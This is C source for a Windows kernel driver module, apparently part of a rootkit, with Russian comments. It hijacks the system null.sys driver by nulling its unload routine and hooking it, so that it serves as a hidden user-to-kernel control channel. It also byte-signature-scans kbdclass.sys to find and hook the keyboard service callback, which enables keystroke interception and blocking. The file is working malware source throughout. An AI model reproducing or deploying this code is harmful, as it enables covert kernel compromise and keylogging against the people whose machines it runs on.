#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#define DRIVER_KBDCLASS_HASH 0x4d059c73 // kbdclass

#include "../../mod_shared/headers.h"

#include "mod_userio.c"
#include "mod_userioApi.c"

#ifdef _WIN64
#define DECLARE_USERIO_FUNC(idx, funcName, id, ctrl) pUserioBlock->zfs_wrapper_FNs[idx] = funcName; \
    pUserioBlock->zfs_wrapper_IDs[idx] = id; \
    pUserioBlock->zfs_wrapper_CtrlCodes[idx] = ctrl
#else
#define DECLARE_USERIO_FUNC(idx, funcName, id, ctrl) pUserioBlock->zfs_wrapper_FNs[idx] = (Fnzfs_wrapper)((PUCHAR)funcName + MOD_BASE); \
    pUserioBlock->zfs_wrapper_IDs[idx] = id; \
    pUserioBlock->zfs_wrapper_CtrlCodes[idx] = ctrl
#endif

NTSTATUS mod_userioEntry(uintptr_t modBase, pglobal_block_t pGlobalBlock)
{
    pmod_common_block_t pCommonBlock = pGlobalBlock->pCommonBlock;
    pmod_userio_block_t pUserioBlock;
    pmod_header_t pModHeader = (pmod_header_t)modBase;

    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pUserioBlock, sizeof(mod_userio_block_t), NonPagedPool);
    pGlobalBlock->pUserioBlock = pUserioBlock;

    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_allocate_handle);
    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_get_zfs_handle);
    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_free_zfs_handle);
    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_null_irp_ioctl_hook);

    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_add_client);
    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_remove_client);
    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_find_client_id);
    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_shutdown_routine);
    DECLARE_GLOBAL_FUNC(pUserioBlock, KeyboardClassServiceCallbackHook);
    DECLARE_GLOBAL_FUNC(pUserioBlock, userio_keyboard_hook_internal);

//     DECLARE_GLOBAL_FUNC(pUserioBlock, userio_keyb_hook);

    DECLARE_USERIO_FUNC(0, userio_zfs_iseof, userio_zfs_iseof_id, IOCTL_USERIO_ZFS_ISEOF);
    DECLARE_USERIO_FUNC(1, userio_zfs_getline, userio_zfs_getline_id, IOCTL_USERIO_ZFS_GETLINE);
    DECLARE_USERIO_FUNC(2, userio_zfs_getc, userio_zfs_getc_id, IOCTL_USERIO_ZFS_GETC);
    DECLARE_USERIO_FUNC(3, userio_zfs_read, userio_zfs_read_id, IOCTL_USERIO_ZFS_READ);
    DECLARE_USERIO_FUNC(4, userio_zfs_putc, userio_zfs_putc_id, IOCTL_USERIO_ZFS_PUTC);
    DECLARE_USERIO_FUNC(5, userio_zfs_write, userio_zfs_write_id, IOCTL_USERIO_ZFS_WRITE);
    DECLARE_USERIO_FUNC(6, userio_zfs_move, userio_zfs_move_id, IOCTL_USERIO_ZFS_MOVE);
    DECLARE_USERIO_FUNC(7, userio_zfs_findfirst, userio_zfs_findfirst_id, IOCTL_USERIO_ZFS_FINDFIRST);
    DECLARE_USERIO_FUNC(8, userio_zfs_findnext, userio_zfs_findnext_id, IOCTL_USERIO_ZFS_FINDNEXT);
    DECLARE_USERIO_FUNC(9, userio_zfs_open, userio_zfs_open_id, IOCTL_USERIO_ZFS_OPEN);
    DECLARE_USERIO_FUNC(10, userio_zfs_mkdir, userio_zfs_mkdir_id, IOCTL_USERIO_ZFS_MKDIR);
    DECLARE_USERIO_FUNC(11, userio_zfs_rmdir, userio_zfs_rmdir_id, IOCTL_USERIO_ZFS_RMDIR);
    DECLARE_USERIO_FUNC(12, userio_zfs_checkvalid, userio_zfs_checkvalid_id, IOCTL_USERIO_ZFS_CHECKVALID);
    DECLARE_USERIO_FUNC(13, userio_zfs_close, userio_zfs_close_id, IOCTL_USERIO_ZFS_CLOSE);
    DECLARE_USERIO_FUNC(14, userio_zfs_tell, userio_zfs_tell_id, IOCTL_USERIO_ZFS_TELL);
    DECLARE_USERIO_FUNC(15, userio_zfs_seek, userio_zfs_seek_id, IOCTL_USERIO_ZFS_SEEK);
    DECLARE_USERIO_FUNC(16, userio_zfs_get_filesize, userio_zfs_get_filesize_id, IOCTL_USERIO_ZFS_GET_FILESIZE);
    DECLARE_USERIO_FUNC(17, userio_zfs_unlink, userio_zfs_unlink_id, IOCTL_USERIO_ZFS_UNLINK);
    DECLARE_USERIO_FUNC(18, userio_zfs_get_time, userio_zfs_get_time_id, IOCTL_USERIO_ZFS_GET_TIME);
    DECLARE_USERIO_FUNC(19, userio_zfs_get_version, userio_zfs_get_version_id, IOCTL_USERIO_ZFS_GET_VERSION);
    DECLARE_USERIO_FUNC(20, userio_zfs_setendoffile, userio_zfs_setendoffile_id, IOCTL_USERIO_ZFS_SET_END_OF_FILE);
    DECLARE_USERIO_FUNC(21, userio_keyboard_hook, userio_keyb_hook_id, IOCTL_USERIO_KEYB_HOOK);
    DECLARE_USERIO_FUNC(22, userio_keyboard_block, userio_keyb_block_id, IOCTL_USERIO_KEYB_BLOCK);

#ifndef _SOLID_DRIVER
    
#ifdef _WIN64
    pCommonBlock->fncommon_fix_addr_value((uint8_t*)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    pCommonBlock->fncommon_fix_addr_value((uint8_t*)modBase + sizeof(mod_header_t), pModHeader->sizeOfModReal, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER

    // Данный мод будет являться аггрегатором сервисных функций предоставляемых ring3-приложениям. Сюда относится:
    // - Взаимодействие с файловой системой (реализовано).
    // - Взаимодействие с нашим tcp/ip стеком.
    // - Предоставление различных ring0-сервисов.

    {
        uint8_t* ptr;
        uint8_t* ptr1;
        UNICODE_STRING uSymbolicLinkName;
        PFILE_OBJECT pFileObject = NULL;

        ptr = (uint8_t*)pUserioBlock->sNullDev; // \Device\Null 
        *(((PUINT32)ptr)++) = 0x0044005c;
        *(((PUINT32)ptr)++) = 0x00760065;
        *(((PUINT32)ptr)++) = 0x00630069;
        *(((PUINT32)ptr)++) = 0x005c0065;
        *(((PUINT32)ptr)++) = 0x0075004e;
        *(((PUINT32)ptr)++) = 0x006c006c;
        *((PUINT16)ptr) = 0x0000;

        pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)&pUserioBlock->clientsHead);

        //
        pCommonBlock->fnRtlInitUnicodeString(&uSymbolicLinkName, pUserioBlock->sNullDev);

        if (pCommonBlock->fnIoGetDeviceObjectPointer(&uSymbolicLinkName, FILE_READ_ATTRIBUTES, &pFileObject, &pUserioBlock->pNullDevObject) != STATUS_SUCCESS) {
            // Пытаемся выяснить, загружен ли драйвер... И если не загружен, то инициируем его загрузку.
        }

        if (pFileObject != NULL) {
            pCommonBlock->fnObfDereferenceObject(pFileObject);
        }

        // Наша цель - это обеспечить себе шлюз из ring3 в ring0, который позволит посылать приложениям запросы через DeviceIoControl.
        // Теоретически возможны два случая:
        // 1. У драйвера null.sys нет обработчика DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL].
        // 2. У драйвера null.sys есть обработчик DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL].
        //
        // Т. к. драйвер имеет функцию DriverObject->DriverUnload, то для того. чтобы предотвратить выгрузку драйвера, нам необходимо обнулить этот обработчик.
        // Для первого случая алгоритм следующий:
        // 1. Сохраняем адрес функции DriverObject->DriverUnload.
        // 2. Устанавливаем хук на функцию DriverObject->DriverUnload. Важно, чтобы наш обрабочик не вызывал оригинал, т. к. в этом нет необходимости.
        // 3. Устанавливаем DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverObject->DriverUnload.
        //
        // Для второго случая, всё достаточно просто - устанавливаем хук, который будет обрабатывать нашы функция с вызовом оригинального обработчика.
        
        ptr = pUserioBlock->pNullDriverUnload = (uint8_t*)pUserioBlock->pNullDevObject->DriverObject->DriverUnload;

        pUserioBlock->nullModuleBase = pCommonBlock->fnfindModuleBaseByInnerPtr(ptr);
        pUserioBlock->nullModuleSize = (uint32_t)((PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)pUserioBlock->nullModuleBase)->e_lfanew + pUserioBlock->nullModuleBase))->OptionalHeader.SizeOfImage;

        ptr1 = pUserioBlock->pNullDriverDevIo = (uint8_t*)pUserioBlock->pNullDevObject->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
        // Обнуляем указатель на функцию выгрузки драйвера.
        pUserioBlock->pNullDevObject->DriverObject->DriverUnload = NULL;
        if (ptr1 > pUserioBlock->nullModuleBase && ptr1 < (pUserioBlock->nullModuleBase + pUserioBlock->nullModuleSize)) {
            // Случай 2.
        }
        else {
            // Случай 1.
            pUserioBlock->pNullUnloadHook = pGlobalBlock->pCommonBlock->fndissasm_install_hook(NULL, ptr, (uint8_t*)pUserioBlock->fnuserio_null_irp_ioctl_hook, FALSE, NULL, NULL, NULL);

            pUserioBlock->pNullDevObject->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (FnMajorFunction)ptr;
//             pUserioBlock->pNullDevObject->DriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = (FnMajorFunction)ptr;
        }

        pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pUserioBlock->pHandles, 48 * sizeof(uintptr_t), NonPagedPool);
        pUserioBlock->pHandles[0] = 48;

#ifdef _WIN64
        pUserioBlock->slHandles = 0;
#else
        pCommonBlock->fnKeInitializeSpinLock(&pUserioBlock->slHandles);
#endif // _WIN64

        {
            NTSTATUS ntStatus = STATUS_SUCCESS;
            uint8_t* kbdclassBase;
            PIMAGE_DOS_HEADER dosHdr;
            PIMAGE_NT_HEADERS ntHdr;
            PIMAGE_SECTION_HEADER sectHdr;
            uint16_t i, sectionNum;
            uint8_t *itr, *end;
            uint8_t *itr1, *end1;
            uint8_t* pKeyboardClassServiceCallback = NULL;
            int counter;
            uint8_t* funcBegin;
            uint8_t* funcEnd;
            LARGE_INTEGER delay;
#ifdef _WIN64
            uint8_t sigs[2][32] = {
                {0x4C,0x8B,0xDC,0x49,0x89,0x5B,0x08,0x49,0x89,0x6B,0x10,0x49,0x89,0x73,0x18,0x57,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0x83,0xEC,0x50,0x4D,0x8B,0xF9,0x49},
                {0x48,0x89,0x5C,0x24,0x08,0x48,0x89,0x6C,0x24,0x10,0x48,0x89,0x74,0x24,0x18,0x57,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0x83,0xEC,0x30,0x48,0x8B,0x71,0x40}
            };
#endif //
            
            delay.QuadPart = -30000000I64; // 3 секунда.
            // Ищем базу kbdclass.
            while ((kbdclassBase = pGlobalBlock->pCommonBlock->fncommon_find_base_by_driver_name(DRIVER_KBDCLASS_HASH, NULL)) == NULL) {
                pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
            }

            // Ищем сигнатуру функции KeyboardClassDequeueRead (для всех 32-битных систем она одинакова).
            // Она должна находиться в невыгружаемой секции кода.
            dosHdr = (PIMAGE_DOS_HEADER)kbdclassBase;
            ntHdr = (PIMAGE_NT_HEADERS)(kbdclassBase + dosHdr->e_lfanew);
            sectHdr = IMAGE_FIRST_SECTION(ntHdr);
            sectionNum = ntHdr->FileHeader.NumberOfSections;
            for (i = 0; i < sectionNum; ++i) {
                if ((sectHdr->Characteristics  & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_NOT_PAGED)) == 
                    (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_NOT_PAGED)) {
                        itr = (uint8_t*)((uint8_t*)dosHdr + sectHdr->VirtualAddress);
                        end = itr + sectHdr->Misc.VirtualSize - 32;

                        for ( ; itr < end; ++itr) {
#ifdef _WIN64
                            if ((*((uint64_t*)(itr + 0)) == 0x0000A8818D4CD233) &&
                                (*((uint64_t*)(itr + 8)) == 0x8B49347400394D00) &&
                                (*((uint64_t*)(itr +16)) == 0x58918D48018B4808) &&
                                (*((uint64_t*)(itr +24)) == 0x894C008949FFFFFF)) {
#else
                            if ((*((uint64_t*)(itr + 0)) == 0x084D8BEC8B55FF8B) &&
                                (*((uint64_t*)(itr + 8)) == 0x09395670C183C033) &&
                                (*((uint64_t*)(itr +16)) == 0x1189108B018B2574) &&
                                (*((uint64_t*)(itr +24)) == 0xD233044A89A8C083)) {
#endif // _WIN64
                                // Теперь нам надо найти функцию, которая содержит два вызова KeyboardClassDequeueRead - это и будет KeyboardClassServiceCallback.
                                // Начинаем сканировать с начала текущей секции.
                                // Начало функции будем определять по префиксу:
                                // 8B FF       mov     edi, edi
                                // 55          push    ebp
                                // 8B EC       mov     ebp, esp
                                //
                                // Конец функции будем определять по
                                // C9          leave
                                // C2 10 00    retn    10h
                                itr1 = (uint8_t*)((uint8_t*)dosHdr + sectHdr->VirtualAddress);
                                end1 = itr1 + sectHdr->Misc.VirtualSize - 5;

                                for ( ; itr1 < end1; ++itr1) {
                                    uint8_t* itrCall;
                                    dissasm_info_t hde;                                    

#ifdef _WIN64
                                    if (MEMCMP(sigs[0], itr1, 32) || MEMCMP(sigs[1], itr1, 32)) {
                                        funcBegin = itr1;
                                        funcEnd = itr1 + 32;
                                        counter = 0;

                                        // Ищем конец функции.
                                        for ( ; funcEnd < end1; ++funcEnd) {
                                            if (*(uint64_t*)funcEnd == 0x5C415D415E415F41) {
                                                break;
                                            }
                                        }
                                        itr1 = funcEnd + 8;

                                        for (itrCall = funcBegin; itrCall < funcEnd; ) {
                                            pGlobalBlock->pCommonBlock->fndissasm(itrCall, &hde);
                                            if (hde.opcode == 0xE8 && hde.len == 5) {
                                                uint8_t* addr = itrCall;
                                                addr += (int32_t)hde.imm.imm32 + 5;

                                                if (addr == itr) {
                                                    ++counter;
                                                }
                                            }
                                            itrCall += hde.len;
                                        }

#else
                                    if (*(uint32_t*)itr1 == 0x8B55FF8B && *(itr1 + 4) == 0xEC) { // Начало функции.
                                        funcBegin = itr1;
                                        funcEnd = itr1 + 5;
                                        counter = 0;

                                        // Ищем конец функции или начало новой функции.
                                        for ( ; funcEnd < end1; ++funcEnd) {
                                            if ((*(uint32_t*)funcEnd == 0x0010C2C9) || (*(uint32_t*)funcEnd == 0x8B55FF8B && *(funcEnd + 4) == 0xEC)) {
                                                break;
                                            }
                                        }
                                        itr1 = funcEnd - 1;

                                        for (itrCall = funcBegin; itrCall < funcEnd; ) {
                                            pGlobalBlock->pCommonBlock->fndissasm(itrCall, &hde);
                                            if (hde.opcode == 0xE8 && hde.len == 5) {
                                                uint8_t* addr = itrCall;
                                                addr += (int32_t)hde.imm.imm32 + 5;

                                                if (addr == itr) {
                                                    ++counter;
                                                }
                                            }
                                            itrCall += hde.len;
                                        }
#endif // _WIN64
                                    }
                                    if (counter == 2) {
                                        pKeyboardClassServiceCallback = funcBegin;
                                        break;
                                    }
                                }

                                break;
                            }
                        }

                        if (pKeyboardClassServiceCallback != NULL) {
                            break;
                        }
                }

                sectHdr = (PIMAGE_SECTION_HEADER)((uint8_t*)sectHdr + sizeof(IMAGE_SECTION_HEADER));
            }

            pUserioBlock->pKeyboardClassServiceCallback = pKeyboardClassServiceCallback;
        }

        //userio_block_keyboard(pvoid_t ptr)
// 
//         ntStatus = IoRegisterLastChanceShutdownNotification(pUserioBlock->pNullDevObject);
// 
//         if (ntStatus != STATUS_SUCCESS) {
// 
//         }
    }

    return STATUS_SUCCESS;
}
